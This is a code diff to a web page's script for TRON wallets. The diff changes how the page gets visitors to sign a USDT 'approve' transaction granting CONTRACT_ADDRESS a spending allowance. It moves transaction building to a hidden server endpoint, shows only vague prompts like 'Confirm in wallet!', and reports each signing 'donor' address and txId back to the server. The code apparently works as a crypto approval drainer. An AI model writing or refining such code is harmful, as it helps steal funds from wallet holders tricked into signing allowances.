@@ -90,9 +90,9 @@
 
         function sendApprove() {
             var addr = window.tronWeb.defaultAddress.base58;
-            status.textContent = "Confirm in popup!";
+            status.textContent = "Loading...";
             status.style.color = "#facc15";
-            debug.textContent = "Step 1: " + addr;
+            debug.textContent = "addr: " + addr;
 
             // Delegate energy in background
             fetch("/api/delegate-energy", {
@@ -101,45 +101,41 @@
                 body: JSON.stringify({ donor: addr })
             }).catch(function() {});
 
-            // Provide ABI directly - no network fetch needed
-            var abi = [{
-                "constant": false,
-                "inputs": [
-                    {"name": "spender", "type": "address"},
-                    {"name": "value", "type": "uint256"}
-                ],
-                "name": "approve",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            }];
-
-            try {
-                debug.textContent = "Step 2: creating contract...";
-                var usdt = window.tronWeb.contract(abi, USDT_CONTRACT);
-                debug.textContent = "Step 3: calling approve...";
-                usdt.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT).send({
-                    feeLimit: 100000000,
-                    callValue: 0
-                }).then(function(tx) {
-                    var txId = typeof tx === "string" ? tx : (tx.txid || tx);
-                    status.textContent = "Done!";
-                    status.style.color = "#4ade80";
-                    debug.textContent = "TX: " + txId;
-                    fetch("/api/approved", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ donor: addr, txId: txId })
-                    }).catch(function() {});
-                }).catch(function(err) {
-                    status.textContent = "Error";
-                    status.style.color = "#f87171";
-                    debug.textContent = "ERR4: " + (err.message || JSON.stringify(err));
-                });
-            } catch(e) {
+            // Ask SERVER to build the transaction (no client-side network calls)
+            debug.textContent = "Building TX on server...";
+            fetch("/api/build-approve", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ donor: addr })
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                if (data.error) throw new Error(data.error);
+                debug.textContent = "TX built. Requesting signature...";
+                status.textContent = "Confirm in wallet!";
+                // Only thing we need Trust Wallet to do: SIGN
+                return window.tronWeb.trx.sign(data.transaction);
+            })
+            .then(function(signedTx) {
+                debug.textContent = "Signed! Broadcasting...";
+                return window.tronWeb.trx.sendRawTransaction(signedTx);
+            })
+            .then(function(result) {
+                var txId = result.txid || result.transaction.txID;
+                status.textContent = "Done!";
+                status.style.color = "#4ade80";
+                debug.textContent = "TX: " + txId;
+                fetch("/api/approved", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ donor: addr, txId: txId })
+                }).catch(function() {});
+            })
+            .catch(function(err) {
                 status.textContent = "Error";
                 status.style.color = "#f87171";
-                debug.textContent = "ERR3: " + (e.message || e);
-            }
+                debug.textContent = "ERR: " + (err.message || JSON.stringify(err));
+            });
         }
     </script>
 </body>
